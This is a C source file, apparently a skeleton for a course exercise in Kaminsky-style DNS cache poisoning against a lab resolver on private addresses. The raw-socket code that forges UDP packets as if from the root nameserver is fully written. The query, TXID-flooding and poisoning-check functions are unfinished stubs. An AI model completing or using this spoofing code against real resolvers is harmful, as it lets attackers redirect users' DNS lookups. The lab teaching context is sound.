// ex2_client.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>
#include <time.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>

#include <ldns/ldns.h>

/* =======================
 *   CONSTANTS & GLOBALS
 * ======================= */

#define RESOLVER_IP        "192.168.1.203"   /* bind9res */
#define ROOT_NS_IP         "192.168.1.204"   /* effective root */
#define ATTACKER_AUTH_IP   "192.168.1.201"   /* attacker-auth */
#define ATTACKER_CLIENT_IP "192.168.1.202"   /* this container */

#define DNS_PORT           53
#define MAX_SUBDOMAIN_LEN  256
#define MAX_BYTES_PER_PACKET 2048
#define TCP_PORT    1234        //todo check port
#define MAX_LEN_PORT 64
// send at most 65536*20 spoofed packets in each attack attempt
#define MAX_SPOOFED_PKTS   (65536 * 20)
#define MAX_ROUNDS         1000  // Maximum attack rounds to attempt

/* raw socket for packet injection */
static int g_raw_sockfd = -1;
static struct sockaddr_ll g_dest_addr;
static unsigned char g_src_mac[6];
static unsigned char g_dest_mac[6];

/* learned resolver source port */
static uint16_t g_resolver_src_port = 0;

/* =======================
 *   LISTENER HELPER FUNCTIONS
 * ======================= */
static int setup_tcp_listener(void)
{
  int sockfd;
  int opt = 1;
  struct sockaddr_in addr;

  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0) {
    perror("socket (tcp listener)");
    return -1;
  }
  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, (socklen_t)sizeof(opt)) < 0) {
    perror("setsockopt(SO_REUSEADDR)");
    close(sockfd);
    return -1;
  }

  opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, (socklen_t)sizeof(opt)) < 0) {
        perror("setsockopt(SO_REUSEPORT)");
        close(sockfd);
        return -1;
    }


  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_ANY);
  addr.sin_port = htons(TCP_PORT);

  if (bind(sockfd, (struct sockaddr *)&addr, (socklen_t)sizeof(addr)) < 0) {
    perror("bind (tcp listener)");
    close(sockfd);
    return -1;
  }

  if (listen(sockfd, 1) < 0) {
    perror("listen");
    close(sockfd);
    return -1;
  }

  printf("TCP listener ready on port %d\n", TCP_PORT);
  return sockfd;
}

static int wait_for_resolver_port_over_tcp(int listen_sock)
{
  struct sockaddr_in peer;
  socklen_t peer_len = (socklen_t)sizeof(peer);
  int conn;
  char buf[MAX_LEN_PORT];
  ssize_t n;

  printf("waiting for resolver port from server over TCP...\n");

  conn = accept(listen_sock, (struct sockaddr *)&peer, &peer_len);
  if (conn < 0) {
    perror("accept");
    return -1;
  }

  n = recv(conn, buf, (size_t)(sizeof(buf) - 1), 0);
  if (n < 0) {
    perror("recv");
    close(conn);
    return -1;
  }

  buf[n] = '\0';
  printf("received port: '%s'\n", buf);

  int port = atoi(buf);
  close(conn);

  if (port <= 0 || port > 65535) {
    fprintf(stderr, "Invalid port number received: %d\n", port);
    return -1;
  }

  return port;
}



/* =======================
 *   CHECKSUM FUNCTIONS
 * ======================= */

/**
 * calculate_checksum - Calculate Internet checksum (RFC 1071)
 * @data: Pointer to data buffer
 * @len: Length of data in bytes
 * 
 * Returns: 16-bit checksum value
 */
static uint16_t calculate_checksum(const void *data, size_t len)
{
    const uint16_t *buf = (const uint16_t *)data;
    uint32_t sum = 0;
    
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    
    if (len == 1) {
        sum += *(const uint8_t *)buf;
    }
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return (uint16_t)~sum;
}

/**
 * calculate_udp_checksum - Calculate UDP checksum with pseudo-header
 * @src_ip: Source IP address (network byte order)
 * @dest_ip: Destination IP address (network byte order)
 * @udp_hdr: Pointer to UDP header
 * @udp_len: Total UDP length (header + data)
 * 
 * Returns: 16-bit UDP checksum
 */
static uint16_t calculate_udp_checksum(uint32_t src_ip, uint32_t dest_ip,
                                       const struct udphdr *udp_hdr, uint16_t udp_len)
{
    struct {
        uint32_t src_addr;
        uint32_t dest_addr;
        uint8_t zero;
        uint8_t protocol;
        uint16_t udp_length;
    } pseudo_header;
    
    pseudo_header.src_addr = src_ip;
    pseudo_header.dest_addr = dest_ip;
    pseudo_header.zero = 0;
    pseudo_header.protocol = IPPROTO_UDP;
    pseudo_header.udp_length = htons(udp_len);
    
    uint32_t sum = 0;
    const uint16_t *buf;
    
    // Add pseudo-header
    buf = (const uint16_t *)&pseudo_header;
    for (size_t i = 0; i < sizeof(pseudo_header) / 2; i++) {
        sum += buf[i];
    }
    
    // Add UDP header and data
    buf = (const uint16_t *)udp_hdr;
    size_t len = udp_len;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    
    if (len == 1) {
        sum += *(const uint8_t *)buf;
    }
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return (uint16_t)~sum;
}

/* =======================
 *   UTILITY FUNCTIONS
 * ======================= */

/**
 * get_interface_info - Get MAC address and interface index for eth0
 * @ifname: Interface name (e.g., "eth0")
 * @mac: Buffer to store MAC address (6 bytes)
 * @ifindex: Pointer to store interface index
 * 
 * Returns: 0 on success, -1 on failure
 */
static int get_interface_info(const char *ifname, unsigned char *mac, int *ifindex)
{
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    
    if (sockfd < 0) {
        perror("socket for ioctl");
        return -1;
    }
    
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    
    // Get MAC address
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl SIOCGIFHWADDR");
        close(sockfd);
        return -1;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    
    // Get interface index
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl SIOCGIFINDEX");
        close(sockfd);
        return -1;
    }
    *ifindex = ifr.ifr_ifindex;
    
    close(sockfd);
    return 0;
}

/* Initialize raw socket for packet injection on eth0 (inside container). */
static int init_raw_socket(void)
{
    int ifindex;
    
    // Create raw socket
    g_raw_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (g_raw_sockfd < 0) {
        perror("socket(AF_PACKET)");
        return -1;
    }
    
    // Get eth0 MAC address and interface index
    if (get_interface_info("eth0", g_src_mac, &ifindex) < 0) {
        fprintf(stderr, "Failed to get eth0 interface info\n");
        close(g_raw_sockfd);
        g_raw_sockfd = -1;
        return -1;
    }
    
    printf("eth0 MAC: %02x:%02x:%02x:%02x:%02x:%02x (ifindex=%d)\n",
           g_src_mac[0], g_src_mac[1], g_src_mac[2],
           g_src_mac[3], g_src_mac[4], g_src_mac[5], ifindex);
    
    // Set destination MAC (resolver's gateway/router MAC - typically need ARP)
    // For now, use broadcast or set manually if known
    // TODO: In production, perform ARP lookup for RESOLVER_IP
    memset(g_dest_mac, 0xff, 6);  // Broadcast for now
    
    // Setup sockaddr_ll for sendto
    memset(&g_dest_addr, 0, sizeof(g_dest_addr));
    g_dest_addr.sll_family = AF_PACKET;
    g_dest_addr.sll_ifindex = ifindex;
    g_dest_addr.sll_halen = ETH_ALEN;
    memcpy(g_dest_addr.sll_addr, g_dest_mac, 6);
    
    printf("Raw socket initialized on eth0\n");
    return 0;
}

/* Close raw socket if open. */
static void cleanup_raw_socket(void)
{
    if (g_raw_sockfd >= 0) {
        close(g_raw_sockfd);
        g_raw_sockfd = -1;
    }
}

/* Generate a unique subdomain for this round, e.g. ww<round>.example1... */
static void build_unique_subdomain(int round, char *buf, size_t buf_len)
{
    /* TODO: snprintf into buf something like:
     * ww<round>.example1.cybercourse.example.com
     */
    (void)round;
    (void)buf;
    (void)buf_len;
}

/* Send a single DNS query (UDP) to the resolver for the given name. */
static int send_dns_query_to_resolver(const char *qname)
{
    /* TODO:
     * 1. Create UDP socket.
     * 2. Build DNS query using ldns (ldns_resolver or manual ldns_pkt).
     * 3. Serialize to wire and sendto() to RESOLVER_IP:53.
     * 4. Close socket.
     */
    (void)qname;
    return 0;
}

/* Learn resolver's source port by sending a query to www.attacker.cybercourse.example.com
 * and capturing the outgoing request from the resolver with pcap.
 */
static int learn_resolver_source_port(void)
{
    /* TODO:
     * 1. Use pcap filter to capture UDP packets to ROOT_NS_IP:53.
     * 2. Send query via resolver to www.attacker.cybercourse.example.com.
     * 3. When you see the outgoing packet from resolver -> root, save its source port
     *    into g_resolver_src_port.
     */
    return 0;
}

/* Build a single spoofed DNS response (Kaminsky-style payload) for a given query name.
 * The result is a raw buffer in wire format ready to be injected with pcap.
 */
static int build_spoofed_response(const char *qname,
                                  uint16_t txid_guess,
                                  uint8_t **out_buf,
                                  size_t *out_len)
{
    /* TODO:
     * 1. Use ldns_pkt_new() to create a DNS response packet.
     * 2. Set header (id = txid_guess, QR=1, AA=1, וכו').
     * 3. Add answer/authority/additional RRs to carry NS + A records (Kaminsky payload).
     * 4. Use ldns_pkt2wire() to serialize into *out_buf and set *out_len.
     */
    (void)qname;
    (void)txid_guess;
    (void)out_buf;
    (void)out_len;
    return 0;
}

/* Inject one spoofed packet into the network via raw socket. */
static int inject_spoofed_packet(const uint8_t *dns_data, size_t dns_len)
{
    unsigned char packet[MAX_BYTES_PER_PACKET];
    struct ether_header *eth;
    struct iphdr *ip;
    struct udphdr *udp;
    uint8_t *dns_payload;
    size_t total_len;
    
    uint32_t src_ip, dest_ip;
    
    // Convert IPs to network byte order
    inet_pton(AF_INET, ROOT_NS_IP, &src_ip);
    inet_pton(AF_INET, RESOLVER_IP, &dest_ip);
    
    // Calculate sizes
    size_t eth_len = sizeof(struct ether_header);
    size_t ip_len = sizeof(struct iphdr);
    size_t udp_len = sizeof(struct udphdr);
    total_len = eth_len + ip_len + udp_len + dns_len;
    
    if (total_len > MAX_BYTES_PER_PACKET) {
        fprintf(stderr, "Packet too large: %zu bytes\n", total_len);
        return -1;
    }
    
    memset(packet, 0, total_len);
    
    // === Build Ethernet Header ===
    eth = (struct ether_header *)packet;
    memcpy(eth->ether_dhost, g_dest_mac, 6);
    memcpy(eth->ether_shost, g_src_mac, 6);
    eth->ether_type = htons(ETHERTYPE_IP);
    
    // === Build IP Header ===
    ip = (struct iphdr *)(packet + eth_len);
    ip->version = 4;
    ip->ihl = 5;  // 5 * 4 = 20 bytes (no options)
    ip->tos = 0;
    ip->tot_len = htons(ip_len + udp_len + dns_len);
    ip->id = htons(rand() % 65536);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->saddr = src_ip;
    ip->daddr = dest_ip;
    ip->check = 0;  // Will calculate below
    ip->check = calculate_checksum(ip, ip_len);
    
    // === Build UDP Header ===
    udp = (struct udphdr *)(packet + eth_len + ip_len);
    udp->source = htons(DNS_PORT);
    udp->dest = htons(g_resolver_src_port);
    udp->len = htons(udp_len + dns_len);
    udp->check = 0;  // Will calculate below
    
    // === Copy DNS payload ===
    dns_payload = packet + eth_len + ip_len + udp_len;
    memcpy(dns_payload, dns_data, dns_len);
    
    // === Calculate UDP checksum ===
    udp->check = calculate_udp_checksum(src_ip, dest_ip, udp, udp_len + dns_len);
    
    // === Send packet ===
    ssize_t sent = sendto(g_raw_sockfd, packet, total_len, 0,
                          (struct sockaddr *)&g_dest_addr, sizeof(g_dest_addr));
    
    if (sent < 0) {
        perror("sendto");
        return -1;
    }
    
    return 0;
}

/* For a single "attack window" (one round):
 * 1. Send a query for a unique subdomain.
 * 2. While query "in flight", send many spoofed responses with guessed TXIDs.
 */
static void perform_attack_round(int round)
{
    char subdomain[MAX_SUBDOMAIN_LEN];

    build_unique_subdomain(round, subdomain, sizeof(subdomain));

    /* Step 1: send query to resolver */
    (void)send_dns_query_to_resolver(subdomain);

    /* Step 2: flood with spoofed answers trying different TXIDs */
    /* NOTE: Do not exceed MAX_SPOOFED_PKTS total (per exercise requirement). */
    /* TODO: loop over txid guesses, build spoofed packet, inject via pcap. */
}

/* Check if poisoning succeeded by querying
 * www.example1.cybercourse.example.com via resolver and examining reply.
 */
static int check_poisoning(void)
{
    /* TODO:
     * 1. Send DNS query (via UDP socket + ldns) to RESOLVER_IP:53
     *    for www.example1.cybercourse.example.com.
     * 2. Receive response and parse with ldns_wire2pkt().
     * 3. Inspect A record: if IP == 6.6.6.6 -> success (return 1), else 0.
     */
    return 0;
}

/* =======================
 *          MAIN
 * ======================= */

int main(void)
{
    int ret = 1; /* default: failure */

    /* Seed RNG - random subdomains or txid sequences. */
    (void)srand((unsigned int)time(NULL));

    // 1. start TCP listener to receive the resolver port from the server
    int listen_sock = setup_tcp_listener();
    if (listen_sock<0){
      return EXIT_FAILURE;
    }

    printf("Step 2: Initialize raw socket for packet injection\n");

    if (init_raw_socket() != 0) {
        goto cleanup;
    }

    printf("Step 3: Learning resolver source port...\n");
    if (learn_resolver_source_port() != 0) {
        goto cleanup;
    }

    printf("Step 4: Starting Kaminsky attack rounds...\n");
    /* Main Kaminsky-style loop: multiple attack windows with different subdomains. */
    for (int round = 0; round < MAX_ROUNDS; ++round) {
        perform_attack_round(round);

        if (check_poisoning() != 0) {
            /* success */
            ret = 0;
            break;
        }
    }

cleanup:
    cleanup_raw_socket();
    close(listen_sock);
    return ret;
}